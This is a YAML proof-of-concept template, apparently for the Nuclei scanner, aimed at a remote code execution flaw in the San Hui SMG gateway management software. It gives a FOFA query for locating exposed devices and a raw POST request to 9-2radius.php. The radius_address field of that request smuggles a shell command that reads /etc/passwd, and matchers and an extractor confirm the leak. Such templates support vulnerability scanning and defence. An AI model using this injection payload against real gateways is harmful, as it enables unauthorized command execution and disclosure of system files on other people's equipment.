id: poc-yaml-san-hui-smg-gms-9-2radius-php-rce
info:
  name: 三汇SMG 网关管理软件 9-2radius.php 远程代码执行漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  metadata:
    finger: 三汇SMG 网关管理软件
    fofa: body="text ml10 mr20" && (title="网关管理软件" || title="Gateway Management")
http:
  - raw:
      - |
        POST /en/9-2radius.php?authority=6 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        save=1&enable_radius=1&radius_address=/';cat+/etc/passwd;+#+
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root:"
          - "/bin"
        part: body
      - type: word
        words:
          - "location.href=\"9-2radius.php\""
        part: body
    extractors:
      - type: regex
        part: body
        regex:
          - "root:.*:/bin.*"
